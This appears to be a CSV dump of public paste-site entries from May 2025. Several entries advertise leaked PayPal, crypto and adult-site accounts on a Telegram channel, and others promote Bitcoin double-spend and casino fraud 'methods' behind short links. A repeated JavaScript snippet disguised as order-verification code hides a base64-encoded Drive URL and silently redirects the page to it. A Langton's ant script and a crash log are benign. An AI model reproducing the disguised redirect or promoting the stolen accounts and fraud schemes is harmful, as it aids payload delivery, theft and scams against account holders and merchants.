id,title,username,language,date,content
R24KyL2i,Stake Free Balance Method,WantingTrae,JavaScript,Sunday 4th of May 2025 05:17:38 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 08272
Niq3ThqU,PayPal with Balance,SpawnKz,JavaScript,Sunday 4th of May 2025 05:17:05 PM CDT,87605 Accounts Posted On https://t.me/leakzbyeminem
ut4zZyy1,Products.js,zebmekey,JavaScript,Sunday 4th of May 2025 05:16:28 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/32557/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
pVHFM3MD,Python for Data Analysis- (Free Course),f0f077,Python,Sunday 4th of May 2025 05:11:39 PM CDT,"Python for Data Analysis- (Free Course)
You know Python. You know Excel. You may even know how to crunch numbers in R using the Tidyverse if you have a statistics background.
What you’ll learn ?  
You will learn the most commonly used tools for data analysis with python including JupyterLab, Numpy and Pandas.
You will learn to create visualizations from your data using Matplotlib and Seaborn.
for more :https://cuty.io/NiL0om
"
TewSriru,Scam Casinos and Stores,WantingTrae,JavaScript,Sunday 4th of May 2025 05:02:15 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 49742
G8vjwNAV,Leaked Accounts - Fresh Hits,SpawnKz,JavaScript,Sunday 4th of May 2025 05:01:43 PM CDT,16567 Accounts Posted On https://t.me/leakzbyeminem
8KZNQ8He,Order.js,zebmekey,JavaScript,Sunday 4th of May 2025 05:01:06 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/96765/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
jFQzWmtB,MySQL for Beginners: MySQL Training from A to Z,f0f077,MySQL,Sunday 4th of May 2025 04:50:08 PM CDT,"MySQL for Beginners: MySQL Training from A to Z
Understanding SQL using the MySQL database. Learning database design and data analysis.
What you will learn
Learn how to design your new database
How to research existing databases to find the information you need
for more:https://cuty.io/1YJGPiGV7"
twsESbkt,Doublespending using Vanity Wallet,WantingTrae,JavaScript,Sunday 4th of May 2025 04:46:52 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 80149
M5XVMNy6,Chaturbate with Tokens,SpawnKz,JavaScript,Sunday 4th of May 2025 04:46:20 PM CDT,51968 Accounts Posted On https://t.me/leakzbyeminem
c9c4p4SQ,Market.js,zebmekey,JavaScript,Sunday 4th of May 2025 04:45:43 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/44716/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FBA62ES5,Abuse RBF in BTC transactions,WantingTrae,JavaScript,Sunday 4th of May 2025 04:31:30 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 87481
isFVhmRF,Crypto Accounts,SpawnKz,JavaScript,Sunday 4th of May 2025 04:30:58 PM CDT,24646 Accounts Posted On https://t.me/leakzbyeminem
khh7xCtV,Untitled,zebmekey,JavaScript,Sunday 4th of May 2025 04:30:21 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/28461/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Uxp9ywdF,# tk_Langtons_Ant_9_Color.py,here2share,Python,Sunday 4th of May 2025 04:18:01 PM CDT,"# tk_Langtons_Ant_9_Color.py

import tkinter as tk
from PIL import Image, ImageTk

WW, HH = 600, 600
GRID_SIZE = 10
ROWS, COLS = HH // GRID_SIZE, WW // GRID_SIZE

root = tk.Tk()
root.geometry(f""{WW}x{HH}+0+0"")

canvas = tk.Canvas(root, width=WW, height=HH)
canvas.pack()

grid = [[0] * COLS for _ in range(ROWS)]
colors = [(255, 255, 255),  # White
          (255, 255, 0),    # Yellow
          (0, 255, 0),      # Green
          (255, 165, 0),    # Orange
          (128, 128, 128),  # Gray
          (0, 0, 255),      # Blue
          (255, 0, 0),      # Red
          (128, 0, 128),    # Purple
          (0, 0, 0)]        # Black

num_colors = len(colors)
ants = {i: (ROWS // 2, COLS // 2) for i in range(num_colors)}

image = Image.new(""RGB"", (COLS, ROWS), ""white"")
image_data = [(255, 255, 255)] * (ROWS * COLS)
ant_direction = 0
    
while True:
	for i in range(num_colors):
		ant_x, ant_y = ants[i]
		grid[ant_x][ant_y] ^= 1

		idx = ant_x * COLS + ant_y
		image_data[idx] = colors[i]  # Update pixel color

		ant_direction = (ant_direction + 1) % 4 if grid[ant_x][ant_y] else (ant_direction - 1) % 4

		# Move Ant
		if ant_direction == 0:
			ant_x -= 1
		elif ant_direction == 1:
			ant_y += 1
		elif ant_direction == 2:
			ant_x += 1
		elif ant_direction == 3:
			ant_y -= 1

		ant_x %= ROWS
		ant_y %= COLS
		ants[i] = (ant_x, ant_y)

	image.putdata(image_data)
	photo = ImageTk.PhotoImage(image.resize((WW, HH), resample=Image.NEAREST))
	canvas.create_image(0, 0, image=photo, anchor=tk.NW)
	root.update()

root.mainloop()"
VMjEjdKK,2025-05-04T17:16:03.681,powerampache,PHP,Sunday 4th of May 2025 04:16:48 PM CDT,"1.01-80 (80) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:864)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:836)
	at android.os.Handler.dispatchMessage(Handler.java:103)
	at android.os.Looper.loop(Looper.java:225)
	at android.os.HandlerThread.run(HandlerThread.java:67)
Caused by: androidx.media3.datasource.HttpDataSource$HttpDataSourceException: java.net.ConnectException: Failed to connect to play.dartiux.xyz/104.131.17.189:443
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:370)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.TeeDataSource.open(TeeDataSource.java:54)
	at androidx.media3.datasource.cache.CacheDataSource.openNextSource(CacheDataSource.java:802)
	at androidx.media3.datasource.cache.CacheDataSource.open(CacheDataSource.java:615)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:88)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1109)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:453)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1167)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:641)
	at java.lang.Thread.run(Thread.java:919)
Caused by: java.net.ConnectException: Failed to connect to play.dartiux.xyz/104.131.17.189:443
	at com.android.okhttp.internal.io.RealConnection.connectSocket(RealConnection.java:147)
	at com.android.okhttp.internal.io.RealConnection.connect(RealConnection.java:116)
	at com.android.okhttp.internal.http.StreamAllocation.findConnection(StreamAllocation.java:186)
	at com.android.okhttp.internal.http.StreamAllocation.findHealthyConnection(StreamAllocation.java:128)
	at com.android.okhttp.internal.http.StreamAllocation.newStream(StreamAllocation.java:97)
	at com.android.okhttp.internal.http.HttpEngine.connect(HttpEngine.java:302)
	at com.android.okhttp.internal.http.HttpEngine.sendRequest(HttpEngine.java:245)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.execute(HttpURLConnectionImpl.java:465)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.connect(HttpURLConnectionImpl.java:131)
	at com.android.okhttp.internal.huc.DelegatingHttpsURLConnection.connect(DelegatingHttpsURLConnection.java:90)
	at com.android.okhttp.internal.huc.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:30)
	at androidx.media3.datasource.DefaultHttpDataSource.makeConnection(DefaultHttpDataSource.java:644)
	at androidx.media3.datasource.DefaultHttpDataSource.makeConnection(DefaultHttpDataSource.java:525)
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:364)
	... 10 more

onPlayerError HttpDataSourceException - PlaybackException 
Error Code: 2001. Se encontraron problemas al reproducir este archivo
{""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":30},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2001,""extras"":{""mMap"":{}},""timestampMs"":13917059311,""cause"":{""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""key"":""https://play.dartiux.xyz/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d2f130aa8eabcf2b45f9aaaec3e00a5bc\u0026type\u003dsong\u0026id\u003d17717"",""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2001,""cause"":{""detailMessage"":""Failed to connect to play.dartiux.xyz/104.131.17.189:443"",""stackTrace"":[{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":147,""methodName"":""connectSocket""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":116,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":186,""methodName"":""findConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":128,""methodName"":""findHealthyConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":97,""methodName"":""newStream""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":302,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":245,""methodName"":""sendRequest""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":465,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":131,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":90,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""connect""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":644,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":525,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":364,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.TeeDataSource"",""fileName"":""TeeDataSource.java"",""lineNumber"":54,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":802,""methodName"":""openNextSource""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":615,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":88,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1109,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":453,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":919,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""java.net.ConnectException: Failed to connect to play.dartiux.xyz/104.131.17.189:443"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.TeeDataSource"",""fileName"":""TeeDataSource.java"",""lineNumber"":54,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":802,""methodName"":""openNextSource""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":615,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":88,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1109,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":453,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":919,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":864,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":836,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":103,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":225,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}
 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":30},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2001,""extras"":{""mMap"":{}},""timestampMs"":13917059311,""cause"":{""dataSpec"":{""absoluteStreamPosition"":0,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""key"":""https://play.dartiux.xyz/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d2f130aa8eabcf2b45f9aaaec3e00a5bc\u0026type\u003dsong\u0026id\u003d17717"",""length"":-1,""position"":0,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2001,""cause"":{""detailMessage"":""Failed to connect to play.dartiux.xyz/104.131.17.189:443"",""stackTrace"":[{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":147,""methodName"":""connectSocket""},{""declaringClass"":""com.android.okhttp.internal.io.RealConnection"",""fileName"":""RealConnection.java"",""lineNumber"":116,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":186,""methodName"":""findConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":128,""methodName"":""findHealthyConnection""},{""declaringClass"":""com.android.okhttp.internal.http.StreamAllocation"",""fileName"":""StreamAllocation.java"",""lineNumber"":97,""methodName"":""newStream""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":302,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":245,""methodName"":""sendRequest""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":465,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":131,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":90,""methodName"":""connect""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""connect""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":644,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":525,""methodName"":""makeConnection""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":364,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.TeeDataSource"",""fileName"":""TeeDataSource.java"",""lineNumber"":54,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":802,""methodName"":""openNextSource""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":615,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":88,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1109,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":453,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":919,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""java.net.ConnectException: Failed to connect to play.dartiux.xyz/104.131.17.189:443"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":370,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.TeeDataSource"",""fileName"":""TeeDataSource.java"",""lineNumber"":54,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":802,""methodName"":""openNextSource""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":615,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":88,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1109,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":453,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":919,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":864,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":836,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":103,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":225,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":67,""methodName"":""run""}],""suppressedExceptions"":[]}"
8sAM0s9k,PayPal with Balance,SpawnKz,JavaScript,Sunday 4th of May 2025 04:15:36 PM CDT,17456 Accounts Posted On https://t.me/leakzbyeminem
HuMreLLg,Stake Free Balance Method,WantingTrae,JavaScript,Sunday 4th of May 2025 04:15:31 PM CDT,Method Posted On https://tinyurl.com/rbfmethod | Password: 21737
rwm1c23t,Products.js,zebmekey,JavaScript,Sunday 4th of May 2025 04:14:58 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/64256/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
525gNKNL,Leaked Accounts - Fresh Hits,SpawnKz,JavaScript,Sunday 4th of May 2025 04:00:14 PM CDT,72204 Accounts Posted On https://t.me/leakzbyeminem
